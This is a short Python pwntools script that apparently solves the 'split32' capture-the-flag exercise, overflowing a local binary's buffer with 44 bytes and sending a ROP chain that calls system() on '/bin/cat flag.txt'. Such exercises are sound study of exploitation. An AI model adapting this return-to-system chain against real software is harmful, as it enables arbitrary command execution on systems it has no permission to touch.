
from pwn import *

p = process('./split32')
p.recv()

rop_chain = p32(0x08048430) # adds system call
rop_chain += p32(0x42424242) #adds a blank address (fills in return address of system)
rop_chain += p32(0x0804a030) # adds "bin/cat flag.txt


p.sendline("A"*44 + rop_chain)  

print(p.recv())


#Split 32
#0x08048649: Usefulfunction (bin/ls)
#0x0804a030: UsefulString (/bin/cat flag.txt)


